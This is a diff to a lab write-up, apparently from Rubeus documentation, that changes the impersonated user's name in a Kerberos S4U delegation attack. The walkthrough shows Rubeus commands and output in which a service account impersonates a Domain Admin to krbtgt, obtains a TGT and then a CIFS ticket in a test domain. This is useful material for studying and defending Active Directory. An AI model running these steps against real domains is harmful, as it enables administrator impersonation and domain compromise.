@@ -164,12 +164,12 @@ c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe asktgt /user:SA-TEST-01 /domain:C
   ASREP (key)              :  0CB6948805F797BF2A82807973B89537
 ```
 
-## s4u impersonate sylvain on krbtgt service
+## s4u impersonate alice on krbtgt service
 
 Then we will perform a `s4u` attack by asking to impersonate a privileged account (here alice is *Domain Admin*).
 
 ```
-c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe s4u /msdsspn:krbtgt/COSMOS /domain:COSMOS /dc=127.0.0.1 /impersonateuser:sylvain /ticket:sa_tgt /outfile:sylvain
+c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe s4u /msdsspn:krbtgt/COSMOS /domain:COSMOS /dc=127.0.0.1 /impersonateuser:alice /ticket:sa_tgt /outfile:alice
 
    ______        _
   (_____ \      | |
@@ -188,7 +188,7 @@ c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe s4u /msdsspn:krbtgt/COSMOS /domai
 [*] Building S4U2self request for: 'SA-TEST-01@COSMOS.CORP'
 [*] Sending S4U2self request
 [+] S4U2self success!
-[*] Got a TGS for 'sylvain' to 'SA-TEST-01@COSMOS.CORP'
+[*] Got a TGS for 'alice' to 'SA-TEST-01@COSMOS.CORP'
 [*] base64(ticket.kirbi):
 
       doIFJDCCBSCgAwIBBaEDAgEWooIERjCCBEJhggQ+MIIEOqADAgEFoQ0bC0NPU01PUy5DT1JQohcwFaAD
@@ -215,9 +215,9 @@ c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe s4u /msdsspn:krbtgt/COSMOS /domai
       WqcRGA8yMDIyMDExNDE0MjYzMFqoDRsLQ09TTU9TLkNPUlCpFzAVoAMCAQGhDjAMGwpTQS1URVNULTAx
 
 
-[*] Ticket written to sylvain_sylvain_to_SA-TEST-01@COSMOS.CORP
+[*] Ticket written to alice_alice_to_SA-TEST-01@COSMOS.CORP
 
-[*] Impersonating user 'sylvain' to target SPN 'krbtgt/COSMOS'
+[*] Impersonating user 'alice' to target SPN 'krbtgt/COSMOS'
 [*] Using domain controller: 127.0.0.1
 [*] Building S4U2proxy request for service: 'krbtgt/COSMOS'
 [*] Sending S4U2proxy request
@@ -250,7 +250,7 @@ c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe s4u /msdsspn:krbtgt/COSMOS /domai
       AwUAQKEAAKURGA8yMDIyMDEwNzE0MzczM1qmERgPMjAyMjAxMDgwMDI2MzBapxEYDzIwMjIwMTE0MTQy
       NjMwWqgNGwtDT1NNT1MuQ09SUKkbMBmgAwIBAqESMBAbBmtyYnRndBsGQ09TTU9T
 
-[*] Ticket written to sylvain_krbtgt_COSMOS
+[*] Ticket written to alice_krbtgt_COSMOS
 ```
 
 Here `Rubeus` ask for `S4uSelf` ticket for himself (SA-TEST-01) and then ask a TGS for `alice` for the service `krbtgt` (actually it's a TGT!)
@@ -308,7 +308,7 @@ c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe asktgs /ticket:alice_krbtgt_COSMO
 
   ServiceName              :  cifs/WIN-P8AJE4ISDL7
   ServiceRealm             :  COSMOS.CORP
-  UserName                 :  sylvain
+  UserName                 :  alice
   UserRealm                :  COSMOS.CORP
   StartTime                :  1/7/2022 3:38:40 PM
   EndTime                  :  1/8/2022 1:26:30 AM
